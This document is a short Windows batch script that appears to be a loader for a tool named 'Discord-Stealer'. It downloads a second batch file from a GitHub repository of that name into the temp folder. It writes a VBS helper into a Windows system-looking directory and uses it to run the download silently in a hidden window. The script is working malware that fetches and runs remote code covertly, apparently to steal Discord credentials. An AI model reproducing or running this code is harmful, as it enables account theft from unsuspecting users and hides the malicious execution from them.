@echo off
set Identifier=%~1
set "Save=%temp%\"
curl --create-dirs -f#kLo "%Save%source.bat" "https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/2.0/source.bat"
>"%localappdata%\Microsoft\WindowsApps\background.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 0
call "%localappdata%\Microsoft\WindowsApps\background.vbs" "%Save%source.bat" "%Identifier%"
exit /b